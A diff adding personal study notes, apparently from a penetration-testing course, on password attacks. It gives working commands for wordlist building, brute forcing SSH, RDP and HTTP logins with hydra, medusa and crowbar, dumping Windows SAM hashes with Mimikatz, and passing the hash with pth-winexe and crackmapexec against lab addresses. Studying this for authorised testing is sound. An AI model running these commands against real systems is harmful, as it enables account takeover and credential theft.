@@ -1,0 +1,64 @@
+------------------
+NOTES
+------------------
+
+Wordlists
+	cewl to create custom Wordlists
+		cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
+			-m = min length
+			-w = wordlist (output) file
+	hashcat/ john rules (hashcat is better but not covered in the course)
+
+Brute force Wordlists
+	very time consuming and barely ever used
+	guessing every single combination of characters
+	can employ rules to cut down on guess amounts
+		like a hashcat mask attack
+	maskprocesser is better than crunch
+
+Common Network service attack methods
+	many popular tools for bruteforcing
+		hydra, medusa, crowbar, spray
+
+	HTTP htaccess attack with medusa
+		medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
+		medusa -d
+			show available protocols
+
+	Remote Desktop attack with crowbar
+		sudo apt install crowbar
+		crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
+
+	SSH Attack with hydra
+		hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+
+	HTTP POST with Hydra
+		<url>:<form parameters>:<condition string>[:<optional>[:<optional>]
+		hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+
+Leveraging Password Hashes
+	Linux
+		/etc/shadow
+	Windows
+		Mimikatz or secrets dump
+		user hashes are stored in the Security Accounts Manager (SAM)
+		Mimikatz extraction from the Local Security Authority Subsystem (LSASS) process memory
+		LSASS runs as SYSTEM need privilege::debug (enables SeDebugPrivilege)
+		since LSASS runs as system, need a higher level than just running mimikatz as admin
+
+		C:\Tools\password_attacks\mimikatz.exe
+		privilege::debug
+		token::elevate
+		lsadump::sam
+
+	Pasing the hash in Windows
+		PTH allows you to remotely authenticate using a claid username and NTLM hash rather than a password
+
+		pth-winexe
+			pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+
+		CME
+			crackmapexec smb 192.168.179.10 -u offsec -H  2892d26cdf84d7a70e2eb3b9f05c425e --local-auth
+
+	Password cracking
+		https://korelogic.com
